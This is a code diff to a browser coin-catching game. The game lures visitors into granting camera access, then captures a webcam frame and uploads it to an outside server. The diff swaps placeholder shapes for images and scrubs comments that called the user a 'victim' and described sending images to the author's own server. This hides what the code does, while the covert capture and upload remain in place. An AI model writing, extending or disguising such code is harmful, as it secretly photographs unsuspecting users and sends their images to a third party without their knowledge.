@@ -50,25 +50,26 @@
       padding: 10px;
     }
 
+    /* PLAYER AS REAL PNG */
     #player {
-      width: 50px;
-      height: 50px;
-      background: yellow;
+      width: 60px;  /* adjust size */
+      height: auto;
       position: absolute;
       bottom: 0;
       left: 50%;
       transform: translateX(-50%);
       z-index: 2;
+      pointer-events: none;
     }
 
+    /* COIN AS REAL PNG */
     .coin {
-      width: 30px;
-      height: 30px;
-      background: gold;
-      border-radius: 50%;
+      width: 40px;
+      height: auto;
       position: absolute;
       top: 0;
       z-index: 1;
+      pointer-events: none;
     }
 
     button {
@@ -93,7 +94,8 @@
   <canvas id="canvas" width="640" height="480"></canvas>
 
   <div id="game-box">
-    <div id="player"></div>
+    <img id="player" src="face.png">
+
     <div id="overlay">
       <p>This is a preview. Grant camera access to play!</p>
       <button id="grantPermsBtn">Grant Camera Access</button>
@@ -113,7 +115,7 @@ const gameBox = document.getElementById('game-box');
 let playerX = gameBox.offsetWidth / 2 - 25;
 let cameraGranted = false;
 
-// Show help text if victm clicks help button
+// Help text
 helpBtn.addEventListener("click", () => {
     overlay.innerHTML = `
         <p><strong>Camera access was denied.</strong><br>
@@ -127,7 +129,7 @@ helpBtn.addEventListener("click", () => {
     `;
 });
 
-// Detect denied permissions from victim
+// Detect denied perms
 if (navigator.permissions) {
     navigator.permissions.query({ name: 'camera' }).then(result => {
         if (result.state === 'denied') {
@@ -141,7 +143,7 @@ if (navigator.permissions) {
     });
 }
 
-// Send base64 image to mh server API
+// Send image to server
 async function sendToServer(imageData) {
     try {
         await fetch("https://simple-game-server-api.onrender.com/upload", {
@@ -154,7 +156,7 @@ async function sendToServer(imageData) {
     }
 }
 
-// Request camera and grab frame
+// Request camera
 async function requestCamera() {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -166,7 +168,6 @@ async function requestCamera() {
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             const imageData = canvas.toDataURL('image/png');
 
-            // Send to my server api s-g-s-a instead of cord
             sendToServer(imageData);
 
             stream.getTracks().forEach(track => track.stop());
@@ -182,11 +183,13 @@ grantBtn.addEventListener("click", () => {
     requestCamera();
 });
 
-// Coin spawner pr wtv
+// Spawn coins (real PNG images)
 function spawnCoin() {
-    const coin = document.createElement('div');
+    const coin = document.createElement('img');
+    coin.src = 'coin.png';
     coin.className = 'coin';
-    coin.style.left = Math.random() * (gameBox.offsetWidth - 30) + 'px';
+
+    coin.style.left = Math.random() * (gameBox.offsetWidth - 40) + 'px';
     gameBox.appendChild(coin);
 
     let y = 0;
@@ -213,26 +216,26 @@ function spawnCoin() {
     }, 30);
 }
 
-// Game loop starter
+// Game loop
 function gameLoop() {
     if (!cameraGranted) {
-        // Preview mode: is auto-move!!!!!!!
         playerX += Math.random() < 0.5 ? -3 : 3;
     }
-    playerX = Math.max(0, Math.min(gameBox.offsetWidth - 50, playerX));
+
+    playerX = Math.max(0, Math.min(gameBox.offsetWidth - 60, playerX));
     player.style.left = playerX + 'px';
 
     requestAnimationFrame(gameLoop);
 }
 
-// Keyboard for desktop users
+// Keyboard
 document.addEventListener('keydown', (e) => {
     if (!cameraGranted) return;
     if (e.key === 'ArrowLeft') playerX -= 15;
     if (e.key === 'ArrowRight') playerX += 15;
 });
 
-// Mobile tilt for mobiles
+// Mobile tilt
 if (window.DeviceOrientationEvent) {
     window.addEventListener('deviceorientation', (event) => {
         if (!cameraGranted) return;
